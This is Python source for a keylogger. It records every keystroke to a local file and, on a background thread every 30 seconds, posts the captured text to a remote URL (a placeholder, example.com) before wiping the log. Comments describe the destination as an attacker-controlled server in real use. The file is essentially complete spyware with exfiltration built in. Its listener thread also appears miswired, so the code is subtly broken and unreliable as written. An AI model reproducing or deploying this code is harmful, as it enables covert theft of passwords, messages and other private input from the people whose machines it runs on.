# simple_keylogger.py

from pynput.keyboard import Key, Listener
import logging
import requests
import threading
import time
import os

# Set up logging to a file.
# This is where the captured keystrokes will be stored.
logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, 
                    format="%(asctime)s: %(message)s")

def on_press(key):
    """
    This function is called every time a key is pressed.
    """
    try:
        # We log the character of the key pressed.
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # If the key is a special key (like 'shift' or 'space'), 
        # it doesn't have a character, so we log its name.
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    This function is called every time a key is released.
    We'll use it to stop the keylogger when the 'esc' key is pressed.
    """
    if key == Key.esc:
        # Stop the listener. This will end the program.
        return False

def send_log_file():
    """
    This function reads the log file and sends its content to a remote server.
    """
    # Check if the log file exists and has content
    if os.path.exists("keylog.txt") and os.path.getsize("keylog.txt") > 0:
        with open("keylog.txt", "r") as f:
            data = f.read()

        # The URL where the keylogger will send the data.
        # This is a placeholder for educational purposes.
        url = "http://example.com/upload" 
        
        try:
            # We use a POST request to send the data.
            # In a real scenario, this would be a URL controlled by the attacker.
            requests.post(url, data={'keystrokes': data}, timeout=5)
            # print("Data sent to server successfully.") # You can uncomment this to see it work
            
            # After sending the data, clear the log file to prevent it from growing too large.
            with open("keylog.txt", "w") as f:
                f.write("")

        except requests.exceptions.RequestException as e:
            # Handle any errors that occur during the request (e.g., no internet connection)
            # print(f"Failed to send data: {e}") # You can uncomment this to see it work
            pass

def periodic_sender():
    """
    This function runs in a separate thread and sends the log file periodically.
    """
    # Loop infinitely to send the data periodically.
    while True:
        send_log_file()
        # Wait for 30 seconds before sending the next batch of data.
        time.sleep(30)


# Create a keyboard listener.
# It will call 'on_press' and 'on_release' for every key event.
listener_thread = threading.Thread(target=Listener, args=(on_press, on_release))
listener_thread.daemon = True

# Create a separate thread for sending data periodically.
sender_thread = threading.Thread(target=periodic_sender)
sender_thread.daemon = True

# Start both threads.
listener_thread.start()
sender_thread.start()

# We need to use join() to keep the main program alive as long as our threads are running.
listener_thread.join()
sender_thread.join()
